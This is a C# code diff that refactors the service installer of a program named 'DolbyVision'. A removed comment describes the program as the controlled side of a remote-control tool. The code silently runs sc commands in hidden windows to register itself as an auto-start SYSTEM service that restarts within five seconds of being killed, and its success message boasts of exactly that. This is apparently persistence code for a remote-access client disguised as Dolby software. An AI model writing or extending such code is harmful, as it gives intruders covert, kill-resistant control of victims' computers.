@@ -385,54 +385,52 @@ namespace DolbyVision
         {
             try
             {
-                // 用当前exe自己的路径安装服务(被控端真实路径)
                 string exePath = Application.ExecutablePath;
                 string binPath = "\"" + exePath + " /service\"";
-                var psi = new ProcessStartInfo("cmd.exe", "/c sc create DolbyVision binPath= " + binPath + " start= auto && sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000 && sc start DolbyVision")
-                {
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    StandardOutputEncoding = Encoding.GetEncoding(936),
-                    StandardErrorEncoding = Encoding.GetEncoding(936)
-                };
-                using (var p = Process.Start(psi))
-                {
-                    string output = p.StandardOutput.ReadToEnd();
-                    string error = p.StandardError.ReadToEnd();
-                    p.WaitForExit(10000);
-                    if (p.ExitCode == 0)
-                        return "OK: 服务安装成功\r\n" + output;
-                    else
-                        return "ERROR: 服务安装失败(可能需要管理员权限)\r\n" + output + error;
-                }
+                // 分步执行,只返回简洁结果
+                bool createOk = RunCmd("sc create DolbyVision binPath= " + binPath + " start= auto");
+                if (!createOk) return "ERROR: 创建服务失败(可能需要管理员权限)";
+                bool failureOk = RunCmd("sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000");
+                bool startOk = RunCmd("sc start DolbyVision");
+                if (startOk)
+                    return "OK: 服务安装并启动成功(SYSTEM权限+开机自启+被杀5秒重启)";
+                else
+                    return "OK: 服务已创建,但启动失败(可能已在运行,重启后生效)";
             }
             catch (Exception ex)
             {
                 return "ERROR: " + ex.Message;
             }
         }
-        private static string UninstallService()
+        private static bool RunCmd(string cmd)
         {
             try
             {
-                var psi = new ProcessStartInfo("cmd.exe", "/c sc stop DolbyVision & sc delete DolbyVision")
+                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                 {
                     CreateNoWindow = true,
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    StandardOutputEncoding = Encoding.GetEncoding(936),
-                    StandardErrorEncoding = Encoding.GetEncoding(936)
+                    RedirectStandardError = true
                 };
                 using (var p = Process.Start(psi))
                 {
-                    string output = p.StandardOutput.ReadToEnd();
-                    string error = p.StandardError.ReadToEnd();
-                    p.WaitForExit(10000);
-                    return "OK: 服务卸载命令已执行\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n" + error);
+                    p.WaitForExit(8000);
+                    return p.ExitCode == 0;
                 }
+            }
+            catch { return false; }
+        }
+        private static string UninstallService()
+        {
+            try
+            {
+                RunCmd("sc stop DolbyVision");
+                bool deleteOk = RunCmd("sc delete DolbyVision");
+                if (deleteOk)
+                    return "OK: 服务已卸载";
+                else
+                    return "WARNING: 服务可能未在运行,删除命令已执行";
             }
             catch (Exception ex)
             {
